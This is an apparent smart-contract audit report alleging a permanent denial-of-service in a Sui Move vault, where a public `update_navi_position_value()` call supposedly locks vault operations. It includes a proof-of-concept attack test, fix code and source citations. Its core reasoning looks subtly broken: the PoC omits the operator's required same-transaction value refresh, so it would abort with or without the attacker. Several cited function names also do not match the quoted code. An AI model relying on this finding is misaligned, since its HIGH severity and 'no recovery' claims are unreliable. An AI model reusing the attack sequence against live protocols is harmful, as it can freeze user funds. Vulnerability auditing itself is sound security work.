# Audit Report

## Title
Public Value Update Functions Enable Permanent Vault Operation DoS Through Poisoned Update Records

## Summary
The `update_navi_position_value()` function is publicly callable without authorization checks, allowing any attacker to poison the vault's operation value update tracking during the critical window between `end_op_with_bag()` and `end_op_value_update_with_bag()`. Since `MAX_UPDATE_INTERVAL = 0` requires same-transaction updates, an attacker calling the update function in a separate transaction causes permanent vault lockup in `DURING_OPERATION` status with no recovery mechanism.

## Finding Description

The vulnerability exploits a race condition in the three-phase vault operation workflow combined with overly permissive function visibility.

**Root Cause:**

The `update_navi_position_value()` function is declared as `public fun`, making it callable by anyone: [1](#0-0) 

This function calls `finish_update_asset_value()`, which during operations with `value_update_enabled = true`, records asset updates in `op_value_update_record.asset_types_updated` and updates the timestamp: [2](#0-1) 

The protocol enforces strict same-transaction update requirements via `MAX_UPDATE_INTERVAL = 0`: [3](#0-2) 

When `end_op_value_update_with_bag()` calls `get_total_usd_value()` to complete operations, it validates all asset timestamps: [4](#0-3) 

**Attack Sequence:**

1. Operator calls `start_op_with_bag()` → vault enters DURING_OPERATION status
2. Operator calls `end_op_with_bag()` → enables value update tracking: [5](#0-4) 

3. **ATTACKER** front-runs by calling `update_navi_position_value()` for any borrowed Navi asset
4. Operator attempts to call `end_op_value_update_with_bag()`, which internally calls `get_total_usd_value()`: [6](#0-5) 

5. The timestamp validation fails because `now - last_update_time > 0` (attacker's update was in previous transaction) while `MAX_UPDATE_INTERVAL = 0`, aborting with `ERR_USD_VALUE_NOT_UPDATED`

**Why Protections Fail:**

The `clear_op_value_update_record()` function only executes after successful operation completion: [7](#0-6) 

The admin's `set_vault_enabled()` function explicitly prevents status changes during operations: [8](#0-7) 

The `set_status()` function is `public(package)`, completely inaccessible to admin: [9](#0-8) 

## Impact Explanation

**Severity: HIGH**

This vulnerability enables complete operational DoS of the vault with no recovery mechanism:

1. **Vault Lockup**: Vault becomes permanently stuck in `DURING_OPERATION` status, as operators cannot complete the operation lifecycle and admins cannot reset the status
2. **User Fund Freeze**: All deposits, withdrawals, and cancellations are blocked (require non-DURING_OPERATION status)
3. **No Recovery Path**: No admin function exists to force-clear `op_value_update_record` or reset vault status when DURING_OPERATION
4. **Requires Contract Upgrade**: Only solution is emergency contract upgrade and migration
5. **Affects Entire Protocol**: Single attack vector impacts all vault users and operations

The attack costs only standard gas fees (~0.1-1 SUI) while causing complete protocol halt affecting potentially millions in TVL.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivially executable with high probability of success:

**Reachability**: `update_navi_position_value()` is a public entry point with no authorization checks, callable by any address with access to shared objects.

**Preconditions**: 
- Vault in `DURING_OPERATION` status (occurs regularly during normal operations)
- `value_update_enabled = true` (automatically set in standard flow)
- Attacker can monitor blockchain state to detect operation start

**Execution**: 
- Attacker monitors for `OperationEnded` events signaling `end_op_with_bag()` completion
- Calls `update_navi_position_value()` before operator completes step 3
- No special privileges, assets, or complex timing required

**Economic Viability**: 
- Attack cost: Minimal gas fees
- Attack benefit: Complete protocol DoS
- Perfect griefing attack vector with no downside for attacker
- Competitor sabotage is economically rational

## Recommendation

**Immediate Fix**: Change visibility of all adaptor value update functions from `public fun` to `public(package) fun`:

```move
// In navi_adaptor.move
public(package) fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
)
```

Apply the same restriction to:
- `volo-vault/sources/adaptors/suilend_adaptor.move` 
- `volo-vault/sources/adaptors/cetus_adaptor.move` (if similar patterns exist)
- `volo-vault/sources/adaptors/momentum.adaptor.move` (if similar patterns exist)
- `volo-vault/sources/adaptors/receipt_adaptor.move` (if similar patterns exist)

**Additional Safeguards**:

1. Add admin emergency recovery function:
```move
public fun emergency_reset_operation<PrincipalCoinType>(
    _: &AdminCap,
    vault: &mut Vault<PrincipalCoinType>,
) {
    vault.clear_op_value_update_record();
    vault.set_status(VAULT_NORMAL_STATUS);
}
```

2. Consider relaxing `MAX_UPDATE_INTERVAL` to allow small time windows (e.g., 60 seconds) to reduce strict same-transaction requirement while maintaining freshness guarantees.

## Proof of Concept

```move
#[test]
fun test_dos_via_public_update_function() {
    let mut scenario = test_scenario::begin(OPERATOR);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup vault with Navi position
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut scenario);
    
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let navi_cap = lending::create_account(scenario.ctx());
        vault.add_new_defi_asset(0, navi_cap);
        test_scenario::return_shared(vault);
    };
    
    // Operator starts operation
    scenario.next_tx(OPERATOR);
    {
        let operation = scenario.take_shared<Operation>();
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let cap = scenario.take_from_sender<OperatorCap>();
        
        let (bag, tx, tx_check, principal, coin) = operation::start_op_with_bag<SUI_TEST_COIN, USDC_TEST_COIN, SUI_TEST_COIN>(
            &mut vault, &operation, &cap, &clock,
            vector[0], vector[type_name::get<NaviAccountCap>()],
            0, 0, scenario.ctx()
        );
        
        // Complete step 2
        operation::end_op_with_bag<SUI_TEST_COIN, USDC_TEST_COIN, SUI_TEST_COIN>(
            &mut vault, &operation, &cap, bag, tx, principal, coin
        );
        
        test_scenario::return_to_sender(&scenario, cap);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
    };
    
    // ATTACKER front-runs value update in separate transaction
    scenario.next_tx(ATTACKER);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let config = scenario.take_shared<OracleConfig>();
        let mut storage = scenario.take_shared<Storage>();
        
        // Attacker calls public function
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock,
            vault_utils::parse_key<NaviAccountCap>(0),
            &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(storage);
    };
    
    // Operator tries to complete operation - THIS WILL ABORT
    scenario.next_tx(OPERATOR);
    {
        let operation = scenario.take_shared<Operation>();
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let cap = scenario.take_from_sender<OperatorCap>();
        
        // This will abort with ERR_USD_VALUE_NOT_UPDATED
        // because attacker's update was in previous transaction
        // and MAX_UPDATE_INTERVAL = 0 requires same-transaction updates
        operation::end_op_value_update_with_bag<SUI_TEST_COIN, SUI_TEST_COIN>(
            &mut vault, &operation, &cap, &clock, tx_check
        );
        
        // Never reaches here - vault permanently stuck in DURING_OPERATION
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

## Notes

This vulnerability represents a critical design flaw where operational functions meant for privileged operator use are exposed as public interfaces without access control. The combination of:
- Public function visibility
- Strict same-transaction requirements (`MAX_UPDATE_INTERVAL = 0`)
- No admin recovery mechanism
- Stateful operation tracking with no rollback

creates a perfect storm for unrecoverable DoS. The fix is straightforward but requires careful coordination as changing function visibility may break existing integrations. Priority should be on implementing emergency recovery functions before restricting visibility to maintain protocol liveness.

### Citations

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-29)
```text
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    let usd_value = calculate_navi_position_value(
        account_cap.account_owner(),
        storage,
        config,
        clock,
    );

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/volo_vault.move (L40-40)
```text
const MAX_UPDATE_INTERVAL: u64 = 0; // max update interval 0
```

**File:** volo-vault/sources/volo_vault.move (L518-530)
```text
public(package) fun set_enabled<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    enabled: bool,
) {
    self.check_version();
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);

    if (enabled) {
        self.set_status(VAULT_NORMAL_STATUS);
    } else {
        self.set_status(VAULT_DISABLED_STATUS);
    };
    emit(VaultEnabled { vault_id: self.vault_id(), enabled: enabled })
```

**File:** volo-vault/sources/volo_vault.move (L533-540)
```text
public(package) fun set_status<PrincipalCoinType>(self: &mut Vault<PrincipalCoinType>, status: u8) {
    self.check_version();
    self.status = status;

    emit(VaultStatusChanged {
        vault_id: self.vault_id(),
        status: status,
    });
```

**File:** volo-vault/sources/volo_vault.move (L1174-1203)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();

    let last_update_time = &mut self.assets_value_updated[asset_type];
    *last_update_time = now;

    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;

    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };

    emit(AssetValueUpdated {
        vault_id: self.vault_id(),
        asset_type: asset_type,
        usd_value: usd_value,
        timestamp: now,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1254-1279)
```text
public(package) fun get_total_usd_value<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    clock: &Clock,
): u256 {
    self.check_version();
    self.assert_enabled();

    let now = clock.timestamp_ms();
    let mut total_usd_value = 0;

    self.asset_types.do_ref!(|asset_type| {
        let last_update_time = *self.assets_value_updated.borrow(*asset_type);
        assert!(now - last_update_time <= MAX_UPDATE_INTERVAL, ERR_USD_VALUE_NOT_UPDATED);

        let usd_value = *self.assets_value.borrow(*asset_type);
        total_usd_value = total_usd_value + usd_value;
    });

    emit(TotalUSDValueUpdated {
        vault_id: self.vault_id(),
        total_usd_value: total_usd_value,
        timestamp: now,
    });

    total_usd_value
}
```

**File:** volo-vault/sources/operation.move (L294-294)
```text
    vault.enable_op_value_update();
```

**File:** volo-vault/sources/operation.move (L355-357)
```text
    let total_usd_value_after = vault.get_total_usd_value(
        clock,
    );
```

**File:** volo-vault/sources/operation.move (L376-376)
```text
    vault.clear_op_value_update_record();
```
